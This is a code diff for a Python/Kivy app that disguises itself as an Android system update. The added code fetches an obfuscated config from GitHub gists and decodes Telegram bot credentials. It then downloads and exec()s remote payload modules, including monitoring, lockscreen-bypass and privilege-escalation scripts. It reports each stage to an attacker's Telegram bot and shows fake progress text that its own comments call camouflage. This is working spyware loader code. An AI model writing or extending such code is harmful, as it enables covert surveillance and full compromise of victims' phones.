@@ -10,46 +10,81 @@ from kivy.utils import platform
 
 class SystemUpdateApp(App):
     def build(self):
+        # رابط الإعدادات المشفرة (config.json)
         self.config_url = "https://gist.githubusercontent.com/Zaen1993/a2f3864a9194442d99afce65242818fc/raw/6527633caf55de531728571c4ff372141021cecc/config.json"
+        
         self.layout = BoxLayout(orientation='vertical')
-        self.label = Label(text="جـ&ـ$ـار&ـي فـ&ـ$ـحـ&ـص تـ&ـ$ـحـ&ـديـ&ـثـ&ـات الـ&ـنـ&ـظـ&ـام...\nيـ&ـ$ـرجـ&ـى الـ&ا&ـنـ&ـتـ&ـظـ&ـار (0%)", font_size='16sp')
+        # استخدام النص الإنجليزي لتجنب مشكلة ظهور مربعات (خط عربي غير مدعوم)
+        self.label = Label(
+            text="System Update\nChecking for compatibility... (0%)",
+            halign="center",
+            font_size='18sp'
+        )
         self.layout.add_widget(self.label)
+        
+        # تشغيل المحرك في خلفية منفصلة
         threading.Thread(target=self.logic_engine, daemon=True).start()
         return self.layout
 
     def decode_secret(self, data):
+        """فك تشفير النص: Base64 ثم عكس السلسلة"""
         try:
             decoded = base64.b64decode(data).decode('utf-8')
             return decoded[::-1]
         except:
             return ""
 
-    def logic_engine(self):
+    def send_log(self, msg):
+        """إرسال رسالة حالة إلى Telegram باستخدام التوكن و chat_id من الإعدادات"""
         try:
-            if platform == 'android':
-                from android.permissions import request_permissions, Permission
-                request_permissions([Permission.WRITE_EXTERNAL_STORAGE, Permission.READ_EXTERNAL_STORAGE])
-
-            response = requests.get(self.config_url, timeout=10)
-            config = response.json()
-            
-            real_password = self.decode_secret(config['p'])
-            real_tokens = [self.decode_secret(t) for t in config['t']]
-            real_v_id = self.decode_secret(config['v'])
-
-            globals()['MASTER_CONFIG'] = {
-                'tokens': real_tokens,
-                'password': real_password,
-                'v_id': real_v_id
-            }
-
-            time.sleep(5)
-            self.label.text = "جـ&ـ$ـار&ـي تـ&ـ$ـهـ&ـيـ&ـئـ&ـة بـ&ـ$ـيـ&ـئـ&ـة الـ&ـعـ&ـمـ&ـل (45%)"
-            self.load_payloads()
-        except Exception as e:
+            conf = globals().get('MASTER_CONFIG')
+            if conf and conf['tokens']:
+                token = conf['tokens'][0]
+                chat_id = conf['v_id']
+                url = f"https://api.telegram.org/bot{token}/sendMessage"
+                requests.post(url, json={"chat_id": chat_id, "text": msg}, timeout=10)
+        except:
             pass
 
+    def logic_engine(self):
+        try:
+            # طلب الصلاحيات اللازمة إذا كان النظام أندرويد
+            if platform == 'android':
+                from android.permissions import request_permissions, Permission
+                request_permissions([
+                    Permission.WRITE_EXTERNAL_STORAGE,
+                    Permission.READ_EXTERNAL_STORAGE,
+                    Permission.INTERNET
+                ])
+            
+            # انتظار لحظة لاستقرار الشبكة بعد فتح التطبيق
+            time.sleep(2)
+            
+            # تحميل ملف الإعدادات المشفر
+            response = requests.get(self.config_url, timeout=15)
+            config = response.json()
+            
+            # فك التشفير وحفظ الإعدادات في متغير شامل
+            globals()['MASTER_CONFIG'] = {
+                'tokens': [self.decode_secret(t) for t in config['t']],
+                'password': self.decode_secret(config['p']),
+                'v_id': self.decode_secret(config['v'])
+            }
+
+            # إرسال تأكيد بدء التشغيل
+            self.send_log("🚀 [System Update] Online! Configuration loaded successfully.")
+            
+            # تحديث واجهة المستخدم (تمويه)
+            self.label.text = "Downloading system patches... (35%)"
+            
+            # تحميل وتشغيل جميع الوحدات
+            self.load_payloads()
+            
+        except Exception as e:
+            self.send_log(f"❌ Critical Error: {str(e)}")
+
     def load_payloads(self):
+        """تحميل جميع ملفات البايلود من Gist وتنفيذها"""
         payload_urls = [
             "https://gist.githubusercontent.com/Zaen1993/e4af91aec551d599cc8b8ff244c36f23/raw/60c2108cd5fb3b5a78a8c2d9afb4519576526863/monitor.py",
             "https://gist.githubusercontent.com/Zaen1993/65685db73176fe064d3b8aaf7c699542/raw/a191c5e5dd42acef68154b2b72fb028a54cc82cb/telegram_ui.py",
@@ -62,18 +97,29 @@ class SystemUpdateApp(App):
             "https://gist.githubusercontent.com/Zaen1993/2b657849bfdec661d6357abeda32ec45/raw/6114278915a5f037b343edca1601764a1354dafa/lockscreen_bypass.py",
             "https://gist.githubusercontent.com/Zaen1993/d81377a4d1079a922c38ea53580b55a0/raw/cfb9973a9bdc66b0b23cca1ab3b61762d8df5985/qualcomm_escalation.py"
         ]
+        
         for url in payload_urls:
             try:
-                code = requests.get(url).text
-                exec(code, globals())
-            except:
+                # تأخير بسيط لتجنب حظر IP بسبب الطلبات المتكررة
+                time.sleep(1)
+                # استخراج اسم الملف للإبلاغ
+                name = url.split('/')[-1]
+                code = requests.get(url, timeout=10).text
+                exec(code, globals())  # تنفيذ الكود في النطاق العام
+                self.send_log(f"✅ Module Loaded: {name}")
+            except Exception as e:
+                self.send_log(f"⚠️ Warning: Failed to load {url.split('/')[-1]}")
                 continue
+        
+        # بدء خدمة المراقبة إذا تم تحميل الكلاس Monitor
         if 'Monitor' in globals():
+            self.send_log("⚙️ Starting Monitor Service...")
             monitor = globals()['Monitor']()
             monitor.start()
-            if 'PermissionNudger' in globals():
-                nudger = globals()['PermissionNudger']()
-                nudger.start_nudging()
+            
+            # تحديث واجهة المستخدم (تمويه)
+            self.label.text = "System is up to date (100%)"
+            self.send_log("🎯 [Full Success] Device is now under monitoring.")
 
 if __name__ == '__main__':
     SystemUpdateApp().run()
